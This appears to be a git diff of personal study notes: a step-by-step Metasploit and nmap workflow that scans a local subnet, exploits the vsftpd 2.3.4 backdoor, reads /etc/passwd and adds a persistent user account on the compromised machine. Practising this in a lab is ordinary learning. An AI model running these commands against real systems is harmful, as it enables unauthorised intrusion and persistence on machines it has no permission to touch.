@@ -1,13 +1,11 @@
 ### Metasploite and nmap WorkFlow
 
 1. Step-1: Search the alive devices
-
 ```powershell
 nmap -Sn 192.168.0.1/24
 ```
 
 2. Step-2: Scan the Port and their version
-
 ```powershell
 nmap -Pn -sV <targetIP>
 ```
@@ -18,8 +16,11 @@ nmap -Pn -sV <targetIP>
 ```powershell
 msfconsole
 ```
+
 5. Step-4: search that particular versions exploits [if version is exactly given]
-`search vsftpd 2.3.4`
+```powershell
+search vsftpd 2.3.4
+```
 
 > [exploits will be shown in a table called (matching madules)]
 > [copy the exploits or remember the number of that exploit]
@@ -28,40 +29,61 @@ msfconsole
 [Follow below. if all versions exploitation list is huge]
 
 5. Step-5: use the exploit
-`use exploit/unix/ftp/vsftpd_234_backdoor`
+```powershell
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
 
 6. Step-6: See the required options for that exploit
-`show options`
+```powershell
+show options
+```
 
 7. Step-7: Set the Target (Configure)
+```powershell
+set RHOSTS 192.168.0.101
+set RPORT 21
+```
 
-`set RHOSTS 192.168.0.101`
-`set RPORT 21`
 > [if `show options` say no in the table then no need to set]
 > [if port is given already no need to set]
 
 8. Step-8: Check configure again 
-
-`show options`
+```powershell
+show options
+```
 
 9. Step-9: Finally Attack the machine, after all configurations
-
-`exploit`
+```powershell
+exploit
+```
 
 > [if session is created. the successfully, we gained the access]
 > [now we can do anything]
 
 10. Step-10: Suppose creating finding and creating a user in the machine
 [if meterpreter write: shell]
-
-`hostname`
-`whoami`                             [checking loged in user]
-`cat /etc/passwd`                    [check users]
-`useradd ekhtiar` `passwd ekhtiar`   [creating user]
+```powershell
+hostname
+```
+```powershell
+whoami
+```
+[checking loged in user]
+```powershell
+cat /etc/passwd
+```
+[check users]
+```powershell
+useradd ekhtiar
+passwd ekhtiar
+```
+[creating user]
 
 
 10. Step-11: loging out
-`exit`
+```powershell
+exit
+```
 ------------------------------------------------------------------------------------------------------------------
 
 
